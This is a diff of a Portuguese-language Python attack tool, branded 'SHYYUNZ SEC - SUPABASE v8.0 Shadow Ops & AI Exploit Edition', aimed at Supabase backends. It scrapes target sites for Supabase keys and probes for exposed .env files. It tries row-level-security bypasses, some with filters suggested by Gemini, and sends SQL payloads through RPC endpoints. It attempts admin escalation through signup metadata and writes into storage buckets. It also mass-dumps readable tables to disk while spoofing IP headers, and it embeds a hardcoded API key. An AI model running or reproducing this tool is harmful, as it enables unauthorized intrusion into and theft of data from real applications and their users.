@@ -35,8 +35,8 @@ BANNER = """
 ██████╔╝██║  ██║   ██║      ██║   ██║ ╚████║███████╗
 ╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═══╝╚══════╝
 [/bold cyan][bold magenta] ╔═════════════════════════════════════════════════════╗
- ║ [bold white]SHYYUNZ SEC - SUPABASE v7.0[/bold white]       ║
- ║ [dim]Tactical Shell & RPC Sniper Edition[/dim]    ║
+ ║ [bold white]SHYYUNZ SEC - SUPABASE v8.0[/bold white]       ║
+ ║ [dim]Shadow Ops & AI Exploit Edition[/dim]     ║
  ╚═════════════════════════════════════════════════════╝[/bold magenta]
 """
 
@@ -115,13 +115,17 @@ class ShyyunzBrain:
         {sample}
         """
         try:
-            response = self.client.models.generate_content(
-                model='gemini-1.5-flash',
-                contents=prompt
-            )
+            response = self.client.models.generate_content(model='gemini-1.5-flash', contents=prompt)
             return response.text
         except Exception as e:
             return f"[red][!] Erro no Cérebro Analítico: {e}[/red]"
+
+    async def suggest_filters(self, table_name: str) -> List[str]:
+        prompt = f"Como auditor de segurança, sugira 3 filtros PostgREST (ex: id=not.eq.0) para tentar burlar RLS na tabela '{table_name}'. Responda APENAS os filtros separados por vírgula."
+        try:
+            res = self.client.models.generate_content(model='gemini-1.5-flash', contents=prompt)
+            return [f.strip() for f in res.text.split(",") if "=" in f]
+        except: return ["id=not.eq.0", "limit=1"]
 
 class ShyyunzAuditor:
     def __init__(self, target: str, apikey: str, bearer: Optional[str] = None):
@@ -160,8 +164,7 @@ class ShyyunzAuditor:
             new_ua = random.choice(USER_AGENTS)
             fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
             self.headers.update({"User-Agent": new_ua, "X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip})
-            if self.proxies:
-                self.current_proxy = random.choice(self.proxies)
+            if self.proxies: self.current_proxy = random.choice(self.proxies)
 
     async def check_service_role(self):
         async with httpx.AsyncClient() as client:
@@ -170,7 +173,6 @@ class ShyyunzAuditor:
                 if resp.status_code == 200:
                     self.is_service_role = True
                     console.print("[bold red blink][!!!] ALERTA CRÍTICO: Chave SERVICE_ROLE Detectada! [!!!][/bold red blink]")
-                    console.print("[bold red]Este projeto está TOTALMENTE EXPOSTO. O RLS foi ignorado.[/bold red]")
             except: pass
 
     @staticmethod
@@ -184,17 +186,12 @@ class ShyyunzAuditor:
 
     async def pre_scan_auth_check(self) -> bool:
         fake_target = "shyyunz_heuristic_check"
-        console.print("[dim][*] Realizando Pré-Scan de Heurística de Autenticação...[/dim]")
         async with httpx.AsyncClient(timeout=10.0) as client:
             try:
                 resp = await client.get(f"{self.base_url}{fake_target}?select=*", headers=self.headers)
-                if resp.status_code == 401:
-                    console.print("[bold red][!] ERRO CRÍTICO 401: AUTENTICAÇÃO REJEITADA![/bold red]")
-                    return False
+                if resp.status_code == 401: console.print("[bold red][!] ERRO: Autenticação Rejeitada (401).[/bold red]"); return False
                 return True
-            except Exception as e:
-                console.print(f"[bold red][!] Falha de conexão: {e}[/bold red]")
-                return False
+            except: return False
 
     async def perform_intelligence_gathering(self):
         console.print("\n[bold yellow]>>> COLETA DE INFORMAÇÕES E EXPLORAÇÃO <<<[/bold yellow]")
@@ -202,132 +199,104 @@ class ShyyunzAuditor:
             async with httpx.AsyncClient() as client:
                 aresp = await client.get(f"{self.auth_url}settings", headers={"apikey": self.apikey}, timeout=10.0)
                 if aresp.status_code == 200:
-                    self.auth_settings = aresp.json()
-                    if not self.auth_settings.get("disable_signup", True): console.print("  [bold red][!] VULNERABILIDADE: Cadastro público (Sign-Up) está ABERTO![/bold red]")
+                    if not aresp.json().get("disable_signup", True): console.print("  [bold red][!] VULN: Sign-Up Aberto![/bold red]")
         except: pass
         try:
             gql_url = f"{self.root_url}/graphql/v1"
-            query = {"query": "{ __schema { types { name fields { name } } } }"}
             async with httpx.AsyncClient() as client:
-                gresp = await client.post(gql_url, headers=self.headers, json=query, timeout=10.0)
-                if gresp.status_code == 200 and "data" in gresp.json():
-                    schema_types = gresp.json()["data"]["__schema"]["types"]
-                    extracted = set()
-                    sensitive_keywords = ["email", "pass", "pwd", "token", "secret", "key", "admin", "phone", "cpf", "cnpj", "balance"]
-                    for t in schema_types:
-                        name = t.get("name", "")
-                        if not name or name.startswith("__") or name in ["Query", "Mutation", "Subscription"]: continue
-                        low_name = name.lower()
-                        extracted.add(low_name); extracted.add(f"{low_name}s")
+                gresp = await client.post(gql_url, headers=self.headers, json={"query": "{ __schema { types { name } } }"}, timeout=10.0)
+                if gresp.status_code == 200:
+                    extracted = [t.get("name").lower() for t in gresp.json()["data"]["__schema"]["types"] if not t.get("name").startswith("__")]
                     if extracted:
                         console.print(f"  [bold green][+] EXPLORAÇÃO GQL: Vazou {len(extracted)} alvos![/bold green]")
-                        for e in extracted: knowledge.learn("tables", e)
-                        self.graphql_discovered = extracted
+                        for e in extracted: knowledge.learn("tables", e); self.graphql_discovered.add(e)
         except: pass
 
-    async def brute_jwt_secret(self):
-        secrets = ["super-secret-jwt-key-with-at-least-thirty-two-characters", "secret", "postgres", "password", "supabase", "12345678901234567890123456789012"]
-        console.print("[dim][*] Testando Segredos JWT comuns (Self-Hosted Recon)...[/dim]")
-        # Brute logic could be here if jwt is installed
-        return None
-
     async def web_recon(self, site_url: str):
-        paths = [".env", "package.json", ".git/config", "wp-config.php.bak", "api/.env", "js/config.js", "js/supabase.js"]
+        paths = [".env", "js/config.js", "supabase.js"]
         async with httpx.AsyncClient(timeout=5.0, follow_redirects=True, verify=False) as client:
             for p in paths:
                 try:
-                    target = urljoin(site_url, p)
-                    res = await client.get(target)
-                    if res.status_code == 200 and ("SUPABASE_" in res.text or "apikey" in res.text):
-                        console.print(f"[bold red][!] VAZAMENTO EM SITE: Arquivo sensível exposto: {target}[/bold red]")
+                    res = await client.get(urljoin(site_url, p))
+                    if res.status_code == 200 and "supabase" in res.text.lower():
+                        console.print(f"[bold red][!] VAZAMENTO SITE: {urljoin(site_url, p)}[/bold red]")
                 except: pass
 
     def analyze_jwt(self, token: str):
         try:
             parts = token.split(".")
             if len(parts) >= 2:
-                payload_b64 = parts[1]
-                payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
-                payload = json.loads(base64.b64decode(payload_b64).decode("utf-8"))
-                console.print(f"\n[bold magenta]--- ANÁLISE JWT ---[/bold magenta]\n[*] Role: [bold cyan]{payload.get('role')}[/bold cyan]")
+                payload = json.loads(base64.b64decode(parts[1] + "==").decode("utf-8"))
+                console.print(f"\n[bold magenta]--- TOKEN JWT ---[/bold magenta]\n[*] Role: {payload.get('role')}\n[*] Metadata: {json.dumps(payload.get('app_metadata'))}")
         except: pass
 
-    async def exploit_login(self, email: str, password: str):
-        console.print(f"[bold cyan][*] Tentando LOGIN: {email}...[/bold cyan]")
+    async def exploit_signup(self, brain: Optional[ShyyunzBrain] = None):
+        email = f"shy.{random.randint(100, 999)}@gmail.com"
+        password = "Shy_" + "".join(random.choices(string.ascii_letters + string.digits, k=10))
         async with httpx.AsyncClient() as client:
             try:
-                resp = await client.post(f"{self.auth_url}token", headers={"apikey": self.apikey}, params={"grant_type": "password"}, json={"email": email, "password": password})
-                if resp.status_code == 200:
-                    data = resp.json(); token = data.get('access_token')
-                    if token: 
-                        console.print(f"[bold green][+] LOGIN SUCESSO![/bold green]")
-                        self.analyze_jwt(token)
-                        return token
-            except: pass
-        return None
-
-    async def exploit_signup(self):
-        email = f"shyyunz.{random.randint(1000, 9999)}@gmail.com"
-        password = "Shy_" + "".join(random.choices(string.ascii_letters + string.digits, k=12))
-        payload = {"email": email, "password": password, "data": {"role": "admin", "is_admin": True}}
-        async with httpx.AsyncClient() as client:
-            try:
-                resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json=payload)
-                if resp.status_code in [200, 201]:
-                    token = resp.json().get('access_token')
-                    if token: console.print("[bold green][+] CONTA CRIADA![/bold green]"); return token
-            except: pass
-        return None
-
-    async def exploit_anonymous(self):
-        async with httpx.AsyncClient() as client:
-            try:
-                resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"data": {}})
+                resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"email": email, "password": password, "data": {"role": "admin"}})
                 if resp.status_code in [200, 201]:
                     token = resp.json().get('access_token')
                     if token: return token
             except: pass
         return None
 
-    async def list_bucket_files(self, bucket_name: str):
-        headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}"}
-        payload = {"prefix": "", "limit": 20, "offset": 0}
-        async with httpx.AsyncClient() as client:
-            try:
-                resp = await client.post(f"{self.storage_url}object/list/{bucket_name}", headers=headers, json=payload)
-                if resp.status_code == 200:
-                    files = resp.json(); table = Table(title=f"Arquivos em {bucket_name}")
-                    table.add_column("Nome"); table.add_column("Tamanho")
-                    for f in files: table.add_row(f.get('name'), str(f.get('metadata', {}).get('size')))
-                    console.print(table)
-            except: pass
-
     async def deep_bucket_scan(self):
-        common_buckets = ["avatars", "backups", "configs", "media", "public", "profiles", "documents", "imports", "exports", "logs"]
-        all_buckets = list(set(common_buckets + knowledge.data.get('buckets', [])))
-        console.print("\n[bold cyan][*] Iniciando Deep Bucket Scan (Testando Escrita/Vazamento)...[/bold cyan]")
-        async with httpx.AsyncClient(headers=self.headers, follow_redirects=True) as client:
-            for b_name in all_buckets:
-                res_listing = await client.get(f"{self.storage_url}bucket/{b_name}")
-                if res_listing.status_code == 200: console.print(f"[bold red][!] BUCKET ABERTO: {b_name}[/bold red]")
-                res_upload = await client.post(f"{self.storage_url}object/{b_name}/sh_test.txt", files={"file": ("sh_test.txt", b"SHYYUNZ SEC: VULN_TEST")})
-                if res_upload.status_code in [200, 201]: console.print(f"[bold red][!!!] BUCKET VULNERÁVEL A ESCRITA: {b_name}[/bold red]")
+        common_buckets = ["avatars", "backups", "configs", "media", "public", "profiles", "documents"]
+        console.print("\n[bold cyan][*] Iniciando Deep Bucket Scan...[/bold cyan]")
+        async with httpx.AsyncClient(headers=self.headers) as client:
+            for b_name in common_buckets:
+                res_l = await client.get(f"{self.storage_url}bucket/{b_name}")
+                if res_l.status_code == 200: console.print(f"[bold red][!] BUCKET ABERTO: {b_name}[/bold red]")
+                res_u = await client.post(f"{self.storage_url}object/{b_name}/sh_test.txt", files={"file": ("sh_test.txt", b"VULN")})
+                if res_u.status_code in [200, 201]: console.print(f"[bold red][!!!] BUCKET ESCRITA: {b_name}[/bold red]")
                 
     async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
-        common_rpcs = ["get_users", "get_all_users", "reset_password", "debug_info", "admin_stats", "get_config", "system_info", "list_all", "get_secrets", "get_api_keys"]
-        all_rpcs = list(set(common_rpcs + knowledge.data.get('rpcs', [])))
-        console.print("\n[bold magenta][*] Iniciando RPC Sniper (Brute-Naming)...[/bold magenta]")
+        common_rpcs = ["get_users", "admin_stats", "get_config", "get_secrets"]
+        console.print("\n[bold magenta][*] Iniciando RPC Sniper...[/bold magenta]")
         async with httpx.AsyncClient(headers=self.headers) as client:
-            for rpc in all_rpcs:
+            for rpc in common_rpcs:
                 res = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json={})
                 if res.status_code in [200, 204]:
                     console.print(f"[bold red][!] RPC ENCONTRADO: {rpc}[/bold red]")
-                    knowledge.learn("rpcs", rpc)
-                    if brain:
-                        analysis = await brain.analyze_data(f"RPC_{rpc}", res.json() if res.status_code == 200 else [])
-                        console.print(Panel(analysis, title=f"Alerta IA (RPC): {rpc}", border_style="red"))
+                    if brain: console.print(Panel(await brain.analyze_data(f"RPC_{rpc}", res.json() if res.status_code == 200 else []), title=f"Analise RPC: {rpc}"))
+                    for i_p in [{"query": "SELECT version()"}, {"sql": "SELECT datname FROM pg_database"}]:
+                        i_r = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json=i_p)
+                        if i_r.status_code == 200 and ("PostgreSQL" in i_r.text or "datname" in i_r.text):
+                            console.print(f"[bold red blink][!!!] SQL INJECTION DETECTADO: {rpc}[/bold red blink]")
 
-    async def check_target(self, client: httpx.AsyncClient, target: str, t_type: str, progress, task_id):
+    async def exploit_escalation(self):
+        payloads = [{"role": "admin"}, {"is_admin": True}, {"app_metadata": {"role": "admin"}}, {"user_metadata": {"role": "admin"}}, {"claims": {"role": "admin"}}]
+        for p in payloads:
+            email = f"shy.burn.{random.randint(100, 999)}@shyyunz.sec"
+            async with httpx.AsyncClient() as client:
+                try:
+                    resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"email": email, "password": "Shy_Admin_123", "data": p})
+                    if resp.status_code in [200, 201]:
+                        token = resp.json().get('access_token')
+                        if token:
+                            console.print(f"[bold green][+] Payload Sucesso: {json.dumps(p)}![/bold green]")
+                            self.bearer = token; self.headers["Authorization"] = f"Bearer {token}"
+                            return True
+                except: continue
+        return False
+
+    async def mass_exfiltration(self):
+        out_dir = f"sh_dump_{self.project_ref}"
+        if not os.path.exists(out_dir): os.makedirs(out_dir)
+        async with httpx.AsyncClient() as client:
+            for r in self.results:
+                if r.get('readable'):
+                    try:
+                        res = await client.get(f"{self.base_url}{r['name']}?select=*", headers=self.headers)
+                        if res.status_code == 200:
+                            f_path = os.path.join(out_dir, f"{r['name']}.json")
+                            with open(f_path, "w") as f: f.write(json.dumps(res.json()))
+                            console.print(f" [bold green][+] SUGADO:[/bold green] {r['name']}")
+                    except: pass
+
+    async def check_target(self, client: httpx.AsyncClient, target: str, t_type: str, progress, task_id, brain: Optional[ShyyunzBrain] = None):
         async with self.semaphore:
             self.rotate_headers()
             url = f"{self.base_url}{target}" if t_type != "BUCKET" else f"{self.storage_url}bucket/{target}"
@@ -337,14 +306,13 @@ class ShyyunzAuditor:
                     resp = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                     readable = (resp.status_code == 200)
                     if not readable:
-                        # Bypass via JOIN
-                        res = await client.get(f"{url}?select=*,auth.users(*)", headers=self.headers, params={"limit": 1})
-                        if res.status_code == 200: readable = True; bypass_used = "JOIN Injection"
-                        if not readable:
-                            # Bypass via Filter Injection
-                            for f in ["id=not.eq.0", "limit=1"]:
-                                res = await client.get(f"{url}?{f}", headers=self.headers)
-                                if res.status_code == 200: readable = True; bypass_used = f"Filter Bypass ({f})"; break
+                        res_j = await client.get(f"{url}?select=*,auth.users(*)", headers=self.headers, params={"limit": 1})
+                        if res_j.status_code == 200: readable = True; bypass_used = "JOIN Injection"
+                        if not readable and brain:
+                            filters = await brain.suggest_filters(target)
+                            for f in filters:
+                                res_f = await client.get(f"{url}?{f}", headers=self.headers)
+                                if res_f.status_code == 200: readable = True; bypass_used = f"AI Bypass ({f})"; break
                 elif t_type == "RPC": 
                     resp = await client.post(url, headers=self.headers, json={})
                     readable = (resp.status_code in [200, 204, 400])
@@ -354,52 +322,37 @@ class ShyyunzAuditor:
 
                 if readable:
                     self.hits_count += 1
-                    has_data = False
-                    if t_type == "TABLE":
-                        try: has_data = len(await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1}).json()) > 0
-                        except: pass
-                        knowledge.learn("tables", target)
-                    self.results.append({"type": t_type, "name": target, "readable": True, "has_data": has_data, "bypass": bypass_used})
+                    self.results.append({"type": t_type, "name": target, "readable": True, "bypass": bypass_used})
                 self.tested_count += 1
-                progress.update(task_id, description=f"[bold red]Auditoria V7.0: [ACERTOS {self.hits_count}] [APRENDIDO {len(knowledge.data.get('tables', []))}] ")
+                progress.update(task_id, description=f"[bold red]Auditoria V8.0: [ACERTOS {self.hits_count}] ")
             except: pass
             finally: progress.advance(task_id)
 
-    async def run_scan(self, tables: List[str], rpcs: List[str], buckets: List[str]):
+    async def run_scan(self, tables: List[str], rpcs: List[str], buckets: List[str], brain: Optional[ShyyunzBrain] = None):
         async with httpx.AsyncClient(verify=False, http2=True) as client:
             total = len(tables) + len(rpcs) + len(buckets)
             with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), console=console) as progress:
-                task = progress.add_task("[bold red]Tactical Recon active...", total=total)
-                await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task) for t in tables], *[self.check_target(client, r, "RPC", progress, task) for r in rpcs], *[self.check_target(client, b, "BUCKET", progress, task) for b in buckets])
+                task = progress.add_task("[bold red]Shadow Operations active...", total=total)
+                await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task, brain) for t in tables], *[self.check_target(client, r, "RPC", progress, task, brain) for r in rpcs], *[self.check_target(client, b, "BUCKET", progress, task, brain) for b in buckets])
 
 async def fetch_supabase_details(url: str):
     if not url.startswith("http"): url = "https://" + url
-    headers = {'User-Agent': 'Mozilla/5.0'}
-    async with httpx.AsyncClient(headers=headers, timeout=15.0, follow_redirects=True, verify=False) as client:
+    async with httpx.AsyncClient(headers={'User-Agent': 'Mozilla/5.0'}, timeout=15.0, follow_redirects=True, verify=False) as client:
         try:
-            console.print(f"[dim][*] Analisando site alvo: {url}...[/dim]")
+            console.print(f"[dim][*] Analisando: {url}...[/dim]")
             res = await client.get(url)
             html = res.text
-            
-            # 1. Busca scripts e caminhos comuns
             scripts = re.findall(r'<script.*?src=["\'](.*?\.js.*?)["\']', html)
-            common_paths = ["js/config.js", "js/supabase.js", "js/main.js", "config.js", "supabase.js", "_next/static/chunks/main.js"]
-            js_urls = [urljoin(url, s) for s in scripts]
-            js_urls += [urljoin(url, p) for p in common_paths]
-            js_urls = list(set(js_urls))
-            
+            common_paths = ["js/config.js", "js/supabase.js", "js/main.js", "config.js"]
+            js_urls = [urljoin(url, s) for s in scripts] + [urljoin(url, p) for p in common_paths]
             url_pattern = r'https://[a-z0-9\-]+\.supabase\.(co|net)'
             key_pattern = r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9.\-_]{50,}|sb_publishable_[a-zA-Z0-9\-_]{20,}|pk_[a-zA-Z0-9\-_]{20,})'
-            
             target, apikey = None, None
-            # Busca no HTML principal
             m_u = re.search(url_pattern, html); m_k = re.search(key_pattern, html)
             if m_u: target = m_u.group(0)
             if m_k: apikey = m_k.group(0)
-            
             if not target or not apikey:
-                console.print("[dim][*] Inteligência de JS Ativada (Deep Scan)...[/dim]")
-                for j_url in js_urls:
+                for j_url in list(set(js_urls)):
                     try:
                         j_res = await client.get(j_url, timeout=5.0)
                         if j_res.status_code == 200:
@@ -407,73 +360,48 @@ async def fetch_supabase_details(url: str):
                             if not apikey: m_k = re.search(key_pattern, j_res.text); apikey = m_k.group(0) if m_k else None
                             if target and apikey: break
                     except: continue
-            
-            if target and apikey:
-                console.print(f"[bold green][+] Supabase detectado! URL: {target}[/bold green]")
-                return target, apikey
+            if target and apikey: console.print(f"[bold green][+] Supabase detectado: {target}[/bold green]"); return target, apikey
             return None, None
-        except Exception as e:
-            console.print(f"[bold red][!] Erro no Scanner: {e}[/bold red]")
-            return None, None
+        except: return None, None
 
 async def audit_routine():
     console.print(Align.center(BRANDED_BANNER))
     console.print(Align.center(Panel.fit("[bold magenta]SUPABASE AUDITOR PRO[/bold magenta]", border_style="cyan")))
     site_url = console.input("\n[bold cyan][🌐 SHY_SEC][/bold cyan] URL do Site Alvo: ").strip()
     if site_url.lower() in ["exit", "sair", "0"]: return False
-    
-    bearer = console.input("[bold cyan][🔑 SHY_SEC][/bold cyan] API Bearer (Opcional): ").strip()
     target, apikey = await fetch_supabase_details(site_url)
-    
     ai_key = "AIzaSyDTyiNk3xvtuNVETIve2UoI1D6VWj605K0"
     brain = ShyyunzBrain(ai_key)
-    
     if not target or not apikey:
-        console.print("[yellow][!] Falha na detecção automática.[/yellow]")
-        target = console.input("[bold cyan][🌐 SHY_SEC][/bold cyan] Informe URL (ou Enter p/ Cancelar): ").strip()
-        if not target: return True
-        apikey = console.input("[bold cyan][🔑 SHY_SEC][/bold cyan] Informe API Key: ").strip()
-        if not apikey: return True
-    
-    auditor = ShyyunzAuditor(target, apikey, bearer if bearer else None)
-    await auditor.web_recon(site_url)
-    await auditor.check_service_role()
+        target = console.input("[bold cyan][🌐 SHY_SEC][/bold cyan] Informe URL: ").strip(); apikey = console.input("[bold cyan][🔑 SHY_SEC][/bold cyan] Informe Key: ").strip()
+        if not target or not apikey: return True
+    auditor = ShyyunzAuditor(target, apikey)
+    await auditor.web_recon(site_url); await auditor.check_service_role()
     if not await auditor.pre_scan_auth_check(): return True
     await auditor.perform_intelligence_gathering()
-    
     tables = list(set(["users", "profiles", "accounts", "admins", "settings", "orders"] + knowledge.data["tables"]))
-    rpcs = list(set(["get_users", "get_config"] + knowledge.data["rpcs"]))
-    buckets = list(set(["avatars", "public", "backups"] + knowledge.data["buckets"]))
-    
-    await auditor.run_scan(tables, rpcs, buckets)
-    
+    await auditor.run_scan(tables, ["get_users", "get_config"], ["avatars", "public"], brain)
     table_map = {}
-    summary = Table(title="[bold red]VETORES DE EXPLORAÇÃO SELECIONADOS[/bold red]")
-    summary.add_column("Nr."); summary.add_column("Tipo"); summary.add_column("Alvo"); summary.add_column("Status")
+    summary = Table(title="[bold red]VETORES ENCONTRADOS (Shadow Ops)[/bold red]")
+    summary.add_column("Nr."); summary.add_column("Alvo"); summary.add_column("Status")
     for idx, r in enumerate(auditor.results, 1):
-        status = "[bold green]EXPOSTO[/bold green]" if r.get('readable') else "[dim]RLS[/dim]"
-        if r.get('bypass'): status += f" ({r['bypass']})"
-        summary.add_row(str(idx), r['type'], r['name'], status)
-        table_map[str(idx)] = r
+        status = "[bold green]EXPOSTO[/bold green]" + (f" ({r['bypass']})" if r.get('bypass') else "") if r.get('readable') else "[dim]RLS[/dim]"
+        summary.add_row(str(idx), r['name'], status); table_map[str(idx)] = r
     console.print(summary)
-    
     while True:
-        console.print("\n[bold cyan][1] Dump [K] Conhecimento [B] Deep Bucket [R] RPC Sniper [D] Mass Exfil [0] Voltar[/bold cyan]")
+        console.print("\n[bold cyan][1] Dump [B] Deep Bucket [R] RPC Sniper [D] Mass Exfil [E] Escalation [0] Voltar[/bold cyan]")
         c = input("\n[S_SEC] Comando: ").strip().upper()
         if c == "0": return True
+        elif c == "E" and await auditor.exploit_escalation(): console.print("[bold green][*] Escalonamento SUCESSO![/bold green]")
         elif c == "1":
-            idx = input("Nr. do Alvo: ").strip()
+            idx = input("Nr. Alvo: ").strip()
             if idx in table_map:
                 res = await httpx.AsyncClient().get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit":10})
-                console.print(Panel(json.dumps(res.json(), indent=2), title=f"Dump: {table_map[idx]['name']}", border_style="green"))
-                if brain and input("\nAnalisar com IA? (S/N): ").upper() == "S":
-                    analysis = await brain.analyze_data(table_map[idx]['name'], res.json())
-                    console.print(Panel(analysis, title="Análise IA", border_style="magenta"))
+                console.print(Panel(json.dumps(res.json(), indent=2), title=f"Dump: {table_map[idx]['name']}"))
+                if brain and input("Analise IA? (S/N): ").upper() == "S": console.print(Panel(await brain.analyze_data(table_map[idx]['name'], res.json()), border_style="magenta"))
         elif c == "R": await auditor.rpc_sniper(brain)
         elif c == "B": await auditor.deep_bucket_scan()
         elif c == "D": await auditor.mass_exfiltration()
-        elif c == "K": console.print(json.dumps(knowledge.data, indent=2))
-        elif c == "0": break
 
 async def main():
     while True:
